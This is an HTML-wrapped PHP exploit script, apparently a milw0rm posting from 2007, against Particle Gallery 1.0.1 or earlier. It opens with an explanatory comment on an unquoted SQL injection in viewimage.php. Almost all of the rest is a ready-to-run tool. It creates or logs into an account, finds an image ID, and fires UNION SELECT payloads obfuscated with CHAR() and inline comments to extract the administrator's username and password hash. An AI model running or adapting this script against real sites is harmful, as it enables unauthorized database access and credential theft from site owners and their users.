<html><head><title>Particle Gallery <= 1.0.1 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?php

/*

Explanation:

Function dbSecure(functions.php):

function dbSecure($code){
	
	if (get_magic_quotes_gpc()) {
	   $code = stripslashes($code);
	}
	
	if (function_exists(&quot;mysql_real_escape_string&quot;)){
		$code = mysql_real_escape_string($code);
	} elseif (function_exists(&quot;mysql_escape_string&quot;)){
		$code = mysql_escape_string($code);
	} else {
		$code = addslashes($code);
	}
	
	return $code;
}


Excellent function for SQL input validation, yet we don't even need this function here as we don't 
need to add any quotes...haha!


Vulnerable Code(viewimage.php):

$t-&gt;set_var(&quot;COMMENT_ID&quot;, &quot;&quot;);
if ($_GET[&quot;editcomment&quot;] &lt;&gt; &quot;&quot;){
	$sql = &quot;SELECT * FROM &quot; . $dbprefix . &quot;comments WHERE commentid = &quot; . dbSecure($_GET[&quot;editcomment&quot;]);
	$cme = $db-&gt;execute($sql);
	if ($usr-&gt;Access &gt; 1 || ($_SESSION[&quot;userid&quot;] == $cme-&gt;fields[&quot;userid&quot;])){
		// allow user to edit the comment
		$t-&gt;set_var(&quot;COMMENTS_TYPE&quot;, &quot;Edit&quot;);
		$t-&gt;set_var(&quot;COMMENT_ID&quot;, $cme-&gt;fields[&quot;commentid&quot;]);
		$t-&gt;set_var(&quot;COMMENTS_FORM&quot;, $core . &quot;&amp;amp;commentspage=&quot; . $page);
		if ($_POST[&quot;comments&quot;] &lt;&gt; &quot;&quot;){
			$t-&gt;set_var(&quot;COMMENTS_TEXT&quot;, un($_POST[&quot;comments&quot;]));
		} else {
			$t-&gt;set_var(&quot;COMMENTS_TEXT&quot;, $cme-&gt;fields[&quot;comments&quot;]);
		}
	}


...classic!

*/

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

if ($argc&lt;3) {
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;              Particle Gallery &lt;= 1.0.1 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_pg.php [HOST] [PATH]\r\n\r\n&quot;;
print &quot;[HOST] 	  = Target server's hostname or ip address\r\n&quot;;
print &quot;[PATH] 	  = Path where Particle Gallery is located\r\n&quot;;
print &quot;e.g. w4ck1ng_pg.php 0 victim.com /pg/\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
die;
}

function footer(){

print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;

}

//Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host = $argv[1];
$path = $argv[2];
$port=80;
$proxy=&quot;&quot;;

for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{
$cmd.=&quot; &quot;.$argv[$i];
}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;              Particle Gallery &lt;= 1.0.1 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;

    echo &quot;\r\n[+] Checking if user exists...&quot;;

    $data=&quot;username=w4ck1ng&quot;;
    $data.=&quot;&amp;password=w4ck1ng&quot;;
    $data.=&quot;&amp;from=&quot;;
    $packet =&quot;POST &quot; . $p . &quot;auth.php?do=signin HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;

    sendpacketii($packet);

    if (strstr($html,&quot;User Control Panel&quot;)){echo &quot;...Yep!\r\n&quot;;}
    else{echo &quot;...Nope!&quot;; 
 
    echo &quot;\r\n[+] Registering...&quot;;

    $data=&quot;rusername=w4ck1ng&quot;;
    $data.=&quot;&amp;password=w4ck1ng&quot;;
    $data.=&quot;&amp;password2=w4ck1ng&quot;;
    $data.=&quot;&amp;email=w4ck1ng%40www.com&quot;;
    $data.=&quot;&amp;do=register&quot;;
    $packet =&quot;POST &quot; . $p . &quot;auth.php?page=register HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;

    sendpacketii($packet);

    $temp=explode(&quot;Set-Cookie: &quot;,$html);
    $temp2=explode(&quot; &quot;,$temp[1]);
    $cookie=$temp2[0];

    if (strstr($html,&quot;Location: index.php?act=newbie&quot;)){echo &quot;...Successful!\r\n&quot;;}
    if (strstr($html,&quot;Registrations are not currently being accepted.&quot;)){echo &quot;...Registration Disabled!\r\n&quot;; footer(); exit;}
    else{} }

    echo &quot;[+] Signing In...&quot;;

    $data=&quot;username=w4ck1ng&quot;;
    $data.=&quot;&amp;password=w4ck1ng&quot;;
    $data.=&quot;&amp;from=&quot;;
    $packet =&quot;POST &quot; . $p . &quot;auth.php?do=signin HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;

    sendpacketii($packet);

    $temp=explode(&quot;Set-Cookie: &quot;,$html);
    $temp2=explode(&quot; &quot;,$temp[1]);
    $cookie=$temp2[0];

    if (strstr($html,&quot;Welcome to your account control panel&quot;)){echo &quot;...Successful!&quot;;}
    else{die(&quot;...Failed!\r\n&quot;); footer(); exit;} 

    $packet =&quot;GET &quot; . $p . &quot; HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot; . $host . &quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot; . $cookie . &quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    sendpacketii($packet);

        if (strstr($html,&quot;&lt;td style=\&quot;text-align: right;\&quot;&gt;&lt;a href=\&quot;viewimage.php?imageid=&quot;)){

	    	$temp=explode(&quot;&lt;td style=\&quot;text-align: right;\&quot;&gt;&lt;a href=\&quot;viewimage.php?imageid=&quot;,$html);
    		$temp2=explode(&quot;\&quot;&gt;&quot;,$temp[1]);
		$imageid=$temp2[0];

		echo &quot;\r\n[+] Image ID Retrieved...&quot; . $imageid . &quot;!\n&quot;;}

	else{echo &quot;\r\n[-] Cannot retrieve a valid image ID...\n&quot;; footer(); exit;}


    $data=&quot;comments=Your+about+to+get+owned%21&quot;;
    $data.=&quot;&amp;do=comment&quot;;
    $data.=&quot;&amp;commentid=&quot;;
    $packet =&quot;POST &quot; . $p . &quot;viewimage.php?imageid=&quot; . $imageid . &quot; HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot; . $cookie . &quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;

    sendpacketii($packet);

    if (strstr($html,&quot;Comments posted successfully!&quot;)){echo &quot;[+] Posting comment...Done!\n&quot;;}
    else{echo &quot;[-] Posting comment...Failed!\n&quot;; footer(); exit;} 

    $sqlArray = array(
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;
);

for ($i=0; $i&lt;=count($sqlArray); $i++){

    $packet =&quot;GET &quot; . $p . $sqlArray[$i] . &quot; HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot; . $host . &quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot; . $cookie . &quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    sendpacketii($packet);

    if (strstr($html,&quot;name=\&quot;comments\&quot;&gt;Username=&quot;)){
	    	$temp3=explode(&quot;id=\&quot;comments\&quot; name=\&quot;comments\&quot;&gt;Username=&quot;,$html);
    		$temp4=explode(&quot;:&quot;,$temp3[1]);
		$ret_user=$temp4[0];

		echo &quot;\r\n[+] Admin User: &quot; . $ret_user;}

    
	elseif (strstr($html,&quot;404&quot;)){
			echo &quot;\r\n[-] Image ID is not valid, please try another!&quot;; footer(); exit;}
    else{} 
}

    $sqlArray = array(
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;,
&quot;viewimage.php?imageid=$imageid&amp;commentspage=1&amp;editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*&quot;
);

for ($i=0; $i&lt;=count($sqlArray); $i++){

    $packet =&quot;GET &quot; . $p . $sqlArray[$i] . &quot; HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot; . $host . &quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot; . $cookie . &quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    sendpacketii($packet);

    if (strstr($html,&quot;:Hash=&quot;)){
	    	$temp3=explode(&quot;Hash=&quot;,$html);
    		$temp4=explode(&quot;&lt;/textarea&gt;&quot;,$temp3[1]);
		$ret_hash=$temp4[0];

		echo &quot;\r\n[+] Admin User: &quot; . $ret_hash . &quot;\n&quot;;}
    else{} 
}

footer();

?&gt;

# milw0rm.com [2007-06-01]</pre></html>